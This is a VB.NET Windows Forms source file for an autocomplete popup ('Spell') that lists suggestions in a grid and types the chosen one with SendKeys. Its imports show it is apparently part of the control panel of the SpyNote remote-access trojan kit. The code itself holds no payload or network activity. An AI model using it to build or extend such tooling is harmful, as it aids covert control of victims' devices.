Imports Microsoft.VisualBasic.CompilerServices
Imports System.ComponentModel
Imports SpyNote_V6._4.SN
Imports SpyNote_V6._4.SN.SpyNote.Stores

Public Class Spell
    Private x As Integer

    Private y As Integer

    Public indx As Integer

    Private bolSort As Boolean

    Public tag01 As String

    Private sel As Integer

    Public Pont As Point
    Public Sub New()
        Me.indx = -1
        Me.bolSort = False
        Me.tag01 = Nothing
        Me.sel = 0
        Me.InitializeComponent()
    End Sub
    Private Sub F(ByVal sp As Boolean)
        Dim str As String
        Dim enumerator As IEnumerator = Nothing
        Try
            Dim tag As Array = DirectCast(Me.ViewManager.Rows(Me.sel).Tag, Array)
            Dim str1 As String = tag.GetValue(0).ToString()
            If (Operators.CompareString(str1, Nothing, False) <> 0) Then
                Dim [integer] As Integer = Conversions.ToInteger(tag.GetValue(1))
                If ([integer] = -1) Then
                    Dim str2 As String = Nothing
                    Try
                        enumerator = Me.ViewManager.SelectedRows.GetEnumerator()
                        If (enumerator.MoveNext()) Then
                            Dim current As DataGridViewRow = DirectCast(enumerator.Current, DataGridViewRow)
                            str2 = current.Cells(1).Value.ToString()
                        End If
                    Finally
                    End Try
                    If (Operators.CompareString(str2, Nothing, False) = 0) Then
                        str = str1
                    Else
                        str = If(Not str2.ToUpper().StartsWith(Me.tag01.ToUpper()), str2, str2.Remove(0, Me.tag01.Length))
                    End If
                Else
                    str = str1.Remove(0, [integer])
                End If
                If (Operators.CompareString(str.Trim(), "", False) = 0) Then
                    str = Me.tag01
                End If
                If (Not sp) Then
                    SendKeys.Send(str)
                Else
                    SendKeys.Send(String.Concat(str, Strings.Space(1)))
                End If
                Dim arrays As Array = DirectCast((New Object() {str1, -1}), Array)
                Me.ViewManager.Rows(Me.sel).Tag = arrays
            End If
        Catch exception As System.Exception
        End Try
    End Sub

    Private Sub GridViewoVerticalScrollBar0()
        Dim columnsWidth As Integer = Me.ViewManager.Columns.GetColumnsWidth(DataGridViewElementStates.Visible)
        Dim flag As Boolean = columnsWidth >= Me.ViewManager.Width
        If flag Then
            Me.VisualStudioHorizontalScrollBar1.Maximum = columnsWidth - Me.ViewManager.Width
        Else
            Me.VisualStudioHorizontalScrollBar1.Maximum = columnsWidth
        End If
        Dim flag2 As Boolean = columnsWidth > Me.ViewManager.Width
        If flag2 Then
            Dim flag3 As Boolean = Not Me.VisualStudioHorizontalScrollBar1.Visible
            If flag3 Then
                Me.VisualStudioHorizontalScrollBar1.Visible = True
            End If
        Else
            Dim flag4 As Boolean = Me.VisualStudioHorizontalScrollBar1.Visible > False
            If flag4 Then
                Me.VisualStudioHorizontalScrollBar1.Visible = False
            End If
        End If
        Dim flag5 As Boolean = Me.ViewManager.Rows.Count > 0
        If flag5 Then
            Dim num As Integer = Me.ViewManager.Rows.Count * Me.ViewManager.Rows(0).Height
            Dim flag6 As Boolean = num > Me.ViewManager.Height
            If flag6 Then
                Dim flag7 As Boolean = Not Me.VisualStudioVerticalScrollBar1.Visible
                If flag7 Then
                    Me.VisualStudioVerticalScrollBar1.Visible = True
                End If
            Else
                Dim flag8 As Boolean = Me.VisualStudioVerticalScrollBar1.Visible > False
                If flag8 Then
                    Me.VisualStudioVerticalScrollBar1.Visible = False
                End If
            End If
        Else
            Dim flag9 As Boolean = Me.VisualStudioVerticalScrollBar1.Visible > False
            If flag9 Then
                Me.VisualStudioVerticalScrollBar1.Visible = False
            End If
        End If
    End Sub
    Private Sub p0_Paint(ByVal sender As Object, ByVal e As PaintEventArgs) Handles P0.Paint
        Dim color As System.Drawing.Color = System.Drawing.Color.FromArgb(45, 45, 48)
        Dim rectangle As System.Drawing.Rectangle = New System.Drawing.Rectangle(0, 0, MyBase.Width, MyBase.Height)
        ControlPaint.DrawBorder(e.Graphics, rectangle, color, 1, ButtonBorderStyle.Solid, color, 1, ButtonBorderStyle.Solid, color, 1, ButtonBorderStyle.Solid, color, 1, ButtonBorderStyle.Solid)
    End Sub

    Private Sub pnltop_MouseDown(ByVal sender As Object, ByVal e As MouseEventArgs) Handles pnltop.MouseDown
        If (e.Button = System.Windows.Forms.MouseButtons.Left) Then
            Me.Pont = e.Location
        End If
    End Sub

    Private Sub pnltop_MouseMove(ByVal sender As Object, ByVal e As MouseEventArgs) Handles pnltop.MouseMove
        If (e.Button = System.Windows.Forms.MouseButtons.Left) Then
            MyBase.Location = MyBase.Location + CType((e.Location - CType(Me.Pont, System.Drawing.Size)), System.Drawing.Size)
        End If
    End Sub

    Private Sub RefScrolls()
        Dim num As Integer = 0
        If (MyBase.Visible) Then
            SyncLock Me.ViewManager
                If (Me.ViewManager.Rows.Count > 0) Then
                    If (Me.ViewManager.Rows.Count * Me.ViewManager.Rows(0).Height > Me.ViewManager.Height) Then
                        num = CInt(Math.Round(CDbl(Me.ViewManager.Height) / CDbl(Me.ViewManager.Rows(0).Height))) - 2
                        If (num < 0) Then
                            num = 0
                        End If
                    End If
                End If
                Me.VisualStudioVerticalScrollBar1.Maximum = Me.ViewManager.Rows.Count - num
                Me.GridViewoVerticalScrollBar0()
                If (Me.indx <> -1) Then
                    Me.ToEndViewManager(Me.indx)
                    Me.indx = -1
                End If
                If (Not Me.bolSort) Then
                    Me.ViewManager.Sort(Me.ViewManager.Columns(1), ListSortDirection.Ascending)
                    Me.bolSort = True
                End If
            End SyncLock
        End If
    End Sub

    Private Sub Spell_Deactivate(ByVal sender As Object, ByVal e As EventArgs) Handles Me.Deactivate
        MyBase.Opacity = 0
        MyBase.Visible = False
    End Sub

    Private Sub Spell_Load(ByVal sender As Object, ByVal e As EventArgs) Handles Me.Load
        Me.TScrolls.Interval = Store.TScrollsInterval
        Me.Trans.Interval = Store.transparency
        Me.TScrolls.Enabled = True
    End Sub

    Private Sub ToEndViewManager(ByVal i As Integer)
        Try
            If (Me.ViewManager.FirstDisplayedScrollingRowIndex >= 0) Then
                Me.ViewManager.FirstDisplayedScrollingRowIndex = i
                Me.ViewManager.CurrentCell = Me.ViewManager.Rows(i).Cells(0)
                Me.ViewManager.Rows(i).Selected = True
            End If
        Catch exception As System.Exception
        End Try
    End Sub

    Private Sub Trans_Tick(ByVal sender As Object, ByVal e As EventArgs) Handles Trans.Tick
        If (MyBase.Opacity > 0.95) Then
            Me.Trans.Enabled = False
        Else
            MyBase.Opacity = MyBase.Opacity + 0.1
        End If
    End Sub

    Private Sub TScrolls_Tick(ByVal sender As Object, ByVal e As EventArgs) Handles TScrolls.Tick
        Me.RefScrolls()
    End Sub

    Private Sub ViewManager_CellMouseClick(ByVal sender As Object, ByVal e As DataGridViewCellMouseEventArgs) Handles ViewManager.CellMouseClick
        If (e.RowIndex <> -1) Then
            Me.VisualStudioVerticalScrollBar1.Llen = If(e.RowIndex >= Me.VisualStudioVerticalScrollBar1.Maximum, Me.VisualStudioVerticalScrollBar1.Maximum, e.RowIndex)
        End If
    End Sub

    Private Sub ViewManager_CellMouseDoubleClick(ByVal sender As Object, ByVal e As DataGridViewCellMouseEventArgs) Handles ViewManager.CellMouseDoubleClick
        MyBase.Opacity = 0
        MyBase.Visible = False
        Me.F(False)
    End Sub

    Private Sub ViewManager_KeyDown(ByVal sender As Object, ByVal e As KeyEventArgs) Handles ViewManager.KeyDown
        If (e.KeyCode = Keys.[Return]) Then
            MyBase.Opacity = 0
            MyBase.Visible = False
            Me.F(False)
        ElseIf (e.KeyCode = Keys.Space) Then
            MyBase.Opacity = 0
            MyBase.Visible = False
            Me.F(True)
        ElseIf (e.KeyCode = Keys.Back) Then
            MyBase.Opacity = 0
            MyBase.Visible = False
        End If
    End Sub

    Private Sub ViewManager_MouseWheel(ByVal sender As Object, ByVal e As MouseEventArgs) Handles ViewManager.MouseWheel
        If (e.Delta <= 1) Then
            Dim visualStudioVerticalScrollBar1 As VisualStudioVerticalScrollBar = Me.VisualStudioVerticalScrollBar1
            visualStudioVerticalScrollBar1.Value = visualStudioVerticalScrollBar1.Value + 1
        Else
            Dim value As VisualStudioVerticalScrollBar = Me.VisualStudioVerticalScrollBar1
            value.Value = value.Value - 1
        End If
    End Sub

    Private Sub ViewManager_RowStateChanged(ByVal sender As Object, ByVal e As DataGridViewRowStateChangedEventArgs) Handles ViewManager.RowStateChanged
        If (e.StateChanged = DataGridViewElementStates.Selected) Then
            Me.VisualStudioVerticalScrollBar1.Llen = If(e.Row.Index >= Me.VisualStudioVerticalScrollBar1.Maximum, Me.VisualStudioVerticalScrollBar1.Maximum, e.Row.Index)
            If (Me.VisualStudioVerticalScrollBar1.Llen <> -1) Then
                Me.sel = Me.VisualStudioVerticalScrollBar1.Llen
            End If
        End If
    End Sub

    Private Sub ViewManager_Scroll(ByVal sender As Object, ByVal e As ScrollEventArgs) Handles ViewManager.Scroll
        If (e.ScrollOrientation <> ScrollOrientation.HorizontalScroll) Then
            Me.y = e.NewValue
            Me.VisualStudioVerticalScrollBar1.Value = Me.y
        Else
            Me.x = e.NewValue
            Me.VisualStudioHorizontalScrollBar1.Value = Me.x
        End If
    End Sub

    Private Sub ViewManager_Sorted(ByVal sender As Object, ByVal e As EventArgs) Handles ViewManager.Sorted
        Me.VisualStudioVerticalScrollBar1.Llen = -1
    End Sub

    Private Sub VisualStudioHorizontalScrollBar1_Scroll_1(ByVal sender As Object) Handles VisualStudioHorizontalScrollBar1.Scroll
        Try
            If (Me.ViewManager.HorizontalScrollingOffset <> -1) Then
                Me.ViewManager.HorizontalScrollingOffset = Me.VisualStudioHorizontalScrollBar1.Value
            End If
        Catch exception As System.Exception
        End Try
    End Sub

    Private Sub VisualStudioVerticalScrollBar1_Scroll_1(ByVal sender As Object) Handles VisualStudioVerticalScrollBar1.Scroll
        Try
            If (Me.ViewManager.FirstDisplayedScrollingRowIndex <> -1) Then
                Me.ViewManager.FirstDisplayedScrollingRowIndex = Me.VisualStudioVerticalScrollBar1.Value
            End If
        Catch exception As System.Exception
            If (Me.ViewManager.FirstDisplayedScrollingRowIndex >= 0) Then
                Me.ViewManager.FirstDisplayedScrollingRowIndex = Me.ViewManager.RowCount - 1
            End If
        End Try
    End Sub
End Class